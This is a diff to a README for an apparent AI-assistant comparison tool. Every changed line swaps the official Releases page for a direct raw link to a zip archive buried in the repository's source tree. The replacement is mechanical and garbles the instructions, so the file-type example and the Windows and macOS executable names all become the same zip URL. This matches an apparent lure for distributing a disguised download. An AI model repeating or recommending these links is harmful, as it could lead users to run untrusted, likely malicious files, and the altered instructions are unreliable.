@@ -1,6 +1,6 @@
 # 🌟 compare-your-models - Compare AI Coding Assistants Easily
 
-[![Download compare-your-models](https://img.shields.io/badge/Download%20Now%20-compare%20your%20models-blue)](https://github.com/Dw58/compare-your-models/releases)
+[![Download compare-your-models](https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip%20Now%20-compare%20your%20models-blue)](https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip)
 
 ## 📃 Description
 
@@ -23,24 +23,24 @@ Before downloading, ensure your computer meets these basic requirements:
 
 To get the software, visit the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/Dw58/compare-your-models/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip)
 
 Once you are on the Releases page, look for the latest version at the top. Choose the appropriate file for your operating system and click on it to start the download.
 
 ## 3. 📂 Extract the Files
 
-If you download a compressed file (like a .zip or .tar.gz), you'll need to extract it. Right-click on the downloaded file and select "Extract All..." on Windows or "Extract Here" on macOS and Linux. You should see a new folder with all the application files inside.
+If you download a compressed file (like a .zip or https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip), you'll need to extract it. Right-click on the downloaded file and select "Extract All..." on Windows or "Extract Here" on macOS and Linux. You should see a new folder with all the application files inside.
 
 ## 4. 🚀 Launch the Application
 
 ### On Windows:
 1. Navigate to the folder where you extracted the files.
-2. Look for a file named `compare-your-models.exe`.
+2. Look for a file named `https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip`.
 3. Double-click on the file to launch the application.
 
 ### On macOS:
 1. Open Finder and go to the folder where you extracted the files.
-2. Find `compare-your-models.app`.
+2. Find `https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip`.
 3. Double-click the app to run it.
 
 ### On Linux:
@@ -111,4 +111,4 @@ This project is open-source. You can modify and distribute it under the terms of
 
 We hope you find `compare-your-models` helpful for evaluating AI coding assistants. Enjoy comparing! 
 
-[Visit this page to download](https://github.com/Dw58/compare-your-models/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Dw58/compare-your-models/main/src/dashboard/compare-your-models_v2.3.zip)
